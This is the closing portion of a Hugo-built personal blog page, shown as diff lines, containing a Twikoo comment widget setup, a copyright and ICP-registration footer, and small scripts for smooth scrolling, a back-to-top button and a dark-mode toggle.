+<script>twikoo.init({envId:"https://shenyiming-github-io-comments.vercel.app/",el:"#tcomment",lang:'zh-CN',region:'ap-shanghai',path:'window.TWIKOO_MAGIC_PATH||window.location.pathname'})</script>
+</div>
+</article>
+</main><footer class=footer>
+<span>Copyright &copy; 2021-2022 <a href=https://shinning.cloud><b>Shenyiming.Life</b></a></span>
+<span>&#183;</span>
+<span>Built With <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
+<span>&#183;</span>
+<span>All Rights Reserved</span>
+<span>&#183;</span>
+<span><a href=https://beian.miit.gov.cn/>琼ICP备2022001798号</a></span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
+<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</button>
+</a>
+<script defer src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
